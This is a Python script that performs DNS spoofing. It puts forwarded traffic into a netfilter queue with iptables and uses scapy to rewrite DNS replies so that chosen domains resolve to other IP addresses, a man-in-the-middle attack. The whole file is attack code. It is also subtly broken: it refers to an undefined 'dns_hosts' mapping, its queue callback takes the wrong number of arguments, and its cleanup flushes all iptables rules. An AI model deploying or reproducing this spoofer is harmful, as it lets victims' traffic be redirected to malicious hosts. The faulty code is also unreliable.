from scapy.all import *
from netfilterqueue import NetfilterQueue
import os

def process_packet(packet, dns_mapping_records):

    # convert netfilter queue packet to scapy packet
    scapy_packet = IP(packet.get_payload())
    
    if scapy_packet.haslayer(DNSRR):
        # if packet is a DNS reply modify it
        print(f'[+] Before: {scapy_packet.summary()}')

        try:

            scapy_packet = modify_packet(scapy_packet, dns_mapping_records)

        except IndexError:

            # not UDP packet
            pass
        print(f'[+] After: {scapy_packet.summary()}') 
        packet.set_payload(bytes(scapy_packet))
    # accept packet
    packet.accept()

def modify_packet(packet, dns_mapping_records):

    # get the DNS question name, the domain name
    qname = packet[DNSQR].qname

    if qname not in dns_hosts:
        print(f'[+] No modification: {qname}')
        return packet
    
    packet[DNS].an = DNSRR(rrname=qname, rdata=dns_hosts[qname])
    packet[DNS].ancount = 1

    del packet[IP].len
    del packet[IP].chksum
    del packet[UDP].len
    del packet[UDP].chksum

    return packet

def dnspoof(dns_mapping_records):
    queue_num = 0
    os.system(f"iptables -I FORWARD -j NFQUEUE --queue-num {queue_num}")
    # instantiate the netfilter queue
    queue = NetfilterQueue()

    try:
        # bind the queue number to our callback `process_packet` and start it
        queue.bind(queue_num, process_packet)
        queue.run()
    except KeyboardInterrupt:
        os.system('iptables --flush')